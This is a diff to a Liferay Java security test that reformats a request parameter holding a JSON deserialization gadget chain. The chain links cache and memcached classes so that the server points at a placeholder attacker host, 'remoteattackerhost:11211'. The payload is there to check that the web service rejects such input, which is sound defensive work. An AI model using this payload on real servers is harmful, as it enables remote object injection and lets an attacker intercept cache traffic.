@@ -75,31 +75,25 @@ public class JSONWebServiceSecureTest extends BaseJSONWebServiceTestCase {
 		MockHttpServletRequest mockHttpServletRequest = createHttpRequest(
 			"/open/run2");
 
-		StringBundler sb = new StringBundler(16);
-
-		sb.append("{\"class\":");
-		sb.append("\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",");
-
-		sb.append("\"entityCache\":{\"class\":");
-		sb.append("\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",");
-
-		sb.append("\"multiVMPool\":{\"class\":");
-		sb.append("\"com.liferay.portal.cache.MultiVMPoolImpl\",");
-
-		sb.append("\"portalCacheManager\":{\"class\":");
-		sb.append("\"com.liferay.portal.cache.memcached.");
-		sb.append("MemcachePortalCacheManager\",\"timeout\":60,\"");
-		sb.append("timeoutTimeUnit\":\"SECONDS\",");
-
-		sb.append("\"memcachedClientPool\":{\"class\":");
-		sb.append("\"com.liferay.portal.cache.memcached.");
-		sb.append("DefaultMemcachedClientFactory\",");
-
-		sb.append("\"connectionFactory\":{\"class\":");
-		sb.append("\"net.spy.memcached.BinaryConnectionFactory\"},");
-		sb.append("\"addresses\":[\"remoteattackerhost:11211\"]}}}}}");
-
-		mockHttpServletRequest.setParameter("bytes", sb.toString());
+		mockHttpServletRequest.setParameter(
+			"bytes",
+			StringBundler.concat(
+				"{\"class\":",
+				"\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\",",
+				"\"entityCache\":{\"class\":",
+				"\"com.liferay.portal.dao.orm.common.EntityCacheImpl\",",
+				"\"multiVMPool\":{\"class\":",
+				"\"com.liferay.portal.cache.MultiVMPoolImpl\",",
+				"\"portalCacheManager\":{\"class\":",
+				"\"com.liferay.portal.cache.memcached.",
+				"MemcachePortalCacheManager\",\"timeout\":60,\"",
+				"timeoutTimeUnit\":\"SECONDS\",",
+				"\"memcachedClientPool\":{\"class\":",
+				"\"com.liferay.portal.cache.memcached.",
+				"DefaultMemcachedClientFactory\",",
+				"\"connectionFactory\":{\"class\":",
+				"\"net.spy.memcached.BinaryConnectionFactory\"},",
+				"\"addresses\":[\"remoteattackerhost:11211\"]}}}}}"));
 
 		JSONWebServiceAction jsonWebServiceAction = lookupJSONWebServiceAction(
 			mockHttpServletRequest);
